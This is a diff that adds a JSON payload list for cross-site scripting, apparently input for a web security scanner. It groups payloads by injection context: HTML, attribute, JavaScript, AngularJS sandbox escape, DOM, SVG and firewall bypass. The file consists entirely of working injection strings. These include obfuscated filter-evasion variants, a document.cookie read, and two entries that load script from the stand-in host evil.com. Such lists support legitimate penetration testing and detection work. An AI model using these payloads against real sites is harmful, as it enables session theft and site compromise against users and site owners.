@@ -1,0 +1,108 @@
+{
+  "category": "xss",
+  "contexts": {
+    "html": {
+      "description": "Payloads injected directly into HTML body context",
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "description": "Classic img onerror", "waf_bypass": false},
+        {"payload": "<img src=x onerror=alert(document.domain)>", "description": "img onerror with domain exfil", "waf_bypass": false},
+        {"payload": "<svg onload=alert(1)>", "description": "SVG onload shorthand", "waf_bypass": false},
+        {"payload": "<svg/onload=alert(1)>", "description": "SVG onload no space", "waf_bypass": false},
+        {"payload": "<details open ontoggle=alert(1)>", "description": "details ontoggle, fires without user interaction when open", "waf_bypass": false},
+        {"payload": "<body onpageshow=alert(1)>", "description": "body onpageshow event", "waf_bypass": false},
+        {"payload": "<marquee onstart=alert(1)>x</marquee>", "description": "marquee onstart, legacy event", "waf_bypass": false},
+        {"payload": "<video><source onerror=alert(1)></video>", "description": "video source onerror", "waf_bypass": false},
+        {"payload": "<math><mtext></mtext><mglyph><svg><mtext></mtext><path><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></path></svg></mglyph></math>", "description": "math/mtext namespace confusion", "waf_bypass": false},
+        {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "description": "SVG animate onbegin", "waf_bypass": false},
+        {"payload": "<input autofocus onfocus=alert(1)>", "description": "input autofocus onfocus", "waf_bypass": false},
+        {"payload": "<select autofocus onfocus=alert(1)>", "description": "select autofocus onfocus", "waf_bypass": false},
+        {"payload": "<textarea autofocus onfocus=alert(1)>", "description": "textarea autofocus onfocus", "waf_bypass": false},
+        {"payload": "<script>alert(1)</script>", "description": "Classic script tag", "waf_bypass": false},
+        {"payload": "<iframe src=javascript:alert(1)>", "description": "iframe javascript: src", "waf_bypass": false}
+      ]
+    },
+    "attribute": {
+      "description": "Payloads that break out of HTML attribute context",
+      "payloads": [
+        {"payload": "\" onmouseover=alert(1) \"", "description": "Double quote breakout with event handler", "waf_bypass": false},
+        {"payload": "' onmouseover=alert(1) '", "description": "Single quote breakout with event handler", "waf_bypass": false},
+        {"payload": "\" autofocus onfocus=alert(1) \"", "description": "Double quote breakout with autofocus", "waf_bypass": false},
+        {"payload": "javascript:alert(1)", "description": "javascript: protocol in href/src attributes", "waf_bypass": false},
+        {"payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)", "description": "HTML entity encoded javascript: protocol", "waf_bypass": false},
+        {"payload": "java\tscript:alert(1)", "description": "Tab character in javascript: protocol", "waf_bypass": false},
+        {"payload": "java\nscript:alert(1)", "description": "Newline in javascript: protocol", "waf_bypass": false},
+        {"payload": "java\rscript:alert(1)", "description": "Carriage return in javascript: protocol", "waf_bypass": false},
+        {"payload": "\" style=x:expression(alert(1)) \"", "description": "CSS expression (IE legacy)", "waf_bypass": false},
+        {"payload": "\" onmouseenter=alert(1)//\"", "description": "onmouseenter with comment terminator", "waf_bypass": false}
+      ]
+    },
+    "javascript": {
+      "description": "Payloads injected inside JavaScript string or code context",
+      "payloads": [
+        {"payload": "'-alert(1)-'", "description": "Single quote string breakout", "waf_bypass": false},
+        {"payload": "\"-alert(1)-\"", "description": "Double quote string breakout", "waf_bypass": false},
+        {"payload": "\\'-alert(1)-\\'", "description": "Escaped quote string breakout", "waf_bypass": false},
+        {"payload": "</script><script>alert(1)</script>", "description": "Close script tag then new script block", "waf_bypass": false},
+        {"payload": "`${alert(1)}`", "description": "Template literal injection", "waf_bypass": false},
+        {"payload": "';alert(1)//", "description": "Quote breakout with comment", "waf_bypass": false},
+        {"payload": "\";alert(1)//", "description": "Double quote breakout with comment", "waf_bypass": false},
+        {"payload": "eval(atob('YWxlcnQoMSk='))", "description": "Base64 decoded eval", "waf_bypass": false},
+        {"payload": "Function('ale'+'rt(1)')()", "description": "Function constructor with string concat", "waf_bypass": false},
+        {"payload": "setTimeout('alert(1)',0)", "description": "setTimeout string eval", "waf_bypass": false}
+      ]
+    },
+    "angular": {
+      "description": "Payloads targeting AngularJS template injection (sandbox escape)",
+      "payloads": [
+        {"payload": "{{constructor.constructor('alert(1)')()}}", "description": "constructor chain to Function constructor", "waf_bypass": false},
+        {"payload": "{{$on.constructor('alert(1)')()}}", "description": "$on.constructor escape", "waf_bypass": false},
+        {"payload": "{{a=['constructor'][0];a=a.constructor;a('alert(1)')()}}", "description": "Bracket notation constructor chain", "waf_bypass": false},
+        {"payload": "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}", "description": "Prototype override AngularJS 1.x", "waf_bypass": false},
+        {"payload": "{{[].pop.constructor('alert(1)')()}}", "description": "Array method constructor escape", "waf_bypass": false},
+        {"payload": "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>", "description": "Full ng-app context", "waf_bypass": false},
+        {"payload": "{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}", "description": "charAt override AngularJS sandbox bypass", "waf_bypass": false}
+      ]
+    },
+    "dom": {
+      "description": "DOM-based XSS payloads exploiting client-side sinks",
+      "payloads": [
+        {"payload": "#<img src=x onerror=alert(1)>", "description": "Fragment identifier HTML injection", "waf_bypass": false},
+        {"payload": "javascript:alert(document.cookie)", "description": "javascript: URI for location/href sinks", "waf_bypass": false},
+        {"payload": "data:text/html,<script>alert(1)</script>", "description": "data: URI HTML injection", "waf_bypass": false},
+        {"payload": "\"><img src=x onerror=alert(1)>", "description": "innerHTML sink breakout", "waf_bypass": false},
+        {"payload": "';alert(1)//", "description": "eval/setTimeout sink string breakout", "waf_bypass": false},
+        {"payload": "\\u0022;alert(1)//", "description": "Unicode escape double quote for script sinks", "waf_bypass": false}
+      ]
+    },
+    "svg": {
+      "description": "SVG-specific XSS vectors",
+      "payloads": [
+        {"payload": "<svg onload=alert(1)>", "description": "SVG onload", "waf_bypass": false},
+        {"payload": "<svg><script>alert(1)</script></svg>", "description": "Script inside SVG namespace", "waf_bypass": false},
+        {"payload": "<svg><set onbegin=alert(1) attributeName=x to=y dur=1s>", "description": "SVG set onbegin event", "waf_bypass": false},
+        {"payload": "<svg><script>alert&lpar;1&rpar;</script></svg>", "description": "HTML entity encoded parens in SVG script", "waf_bypass": false},
+        {"payload": "<svg><![CDATA[<image src=\"-\" onerror=\"alert(1)\"/>]]></svg>", "description": "CDATA breakout attempt", "waf_bypass": false},
+        {"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>", "description": "SVG with explicit namespace", "waf_bypass": false}
+      ]
+    },
+    "waf_bypass": {
+      "description": "Payloads designed to evade Web Application Firewalls",
+      "payloads": [
+        {"payload": "';alert`1`//", "description": "Template literal call to bypass alert() pattern matching", "waf_bypass": true},
+        {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "description": "Nested/broken script tag polyglot", "waf_bypass": true},
+        {"payload": "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>", "description": "HTML entity encoded payload in SVG", "waf_bypass": true},
+        {"payload": "<IMG SRC=x OnErRoR=alert(1)>", "description": "Mixed case event handler", "waf_bypass": true},
+        {"payload": "<<script>alert(1)//<</script>", "description": "Double open angle bracket", "waf_bypass": true},
+        {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "description": "URL encoded script tag", "waf_bypass": true},
+        {"payload": "<script>window['ale'+'rt'](1)</script>", "description": "String concat bracket notation", "waf_bypass": true},
+        {"payload": "<script>location='javascript:al\\u0065rt(1)'</script>", "description": "Unicode escape in string", "waf_bypass": true},
+        {"payload": "<svg onload=eval(atob('YWxlcnQoMSk='))>", "description": "base64 encoded payload", "waf_bypass": true},
+        {"payload": "<script>with(document)body.appendChild(createElement('script')).src='//evil.com'</script>", "description": "Dynamic script element load via with()", "waf_bypass": true},
+        {"payload": "<scRiPt sRc=//evil.com></sCripT>", "description": "Mixed case script src", "waf_bypass": true},
+        {"payload": "<img src=1 href=1 onerror=\"javascript:alert(1)\">", "description": "Polyglot img with multiple attributes", "waf_bypass": true},
+        {"payload": "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>", "description": "MathML xlink href data URI", "waf_bypass": true},
+        {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//", "description": "Polyglot multi-context bypass", "waf_bypass": true}
+      ]
+    }
+  }
+}
